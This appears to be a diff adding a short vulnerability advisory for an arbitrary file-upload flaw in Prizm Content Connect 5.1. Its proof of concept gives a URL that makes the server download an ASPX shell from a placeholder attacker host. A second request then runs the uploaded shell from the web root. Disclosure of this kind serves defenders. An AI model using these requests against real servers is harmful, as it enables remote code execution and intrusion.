@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/57242/info
+
+Prizm Content Connect is prone to an arbitrary file-upload vulnerability because it fails to adequately validate files before uploading them.
+
+An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in an arbitrary code execution within the context of the vulnerable application.
+
+Prizm Content Connect 5.1 is vulnerable; other versions may also be affected. 
+
+Proof of concept
+
+First, the attacker causes the Prizm Content Connect software to download
+the malicious ASPX file:
+
+http://www.example.com/default.aspx?document=http://attacker.example.org/aspxshell.aspx
+
+The resulting page discloses the filename to which the ASPX file was
+downloaded, e.g.:
+
+Document Location: C:\Project\
+
+Full Document Path: C:\Project\ajwyfw45itxwys45fgzomrmv.aspx
+
+Temp Location: C:\tempcache\
+
+The attacker then requests the ASPX shell from the root of the website:
+
+http://www.example.com/ajwyfw45itxwys45fgzomrmv.aspx
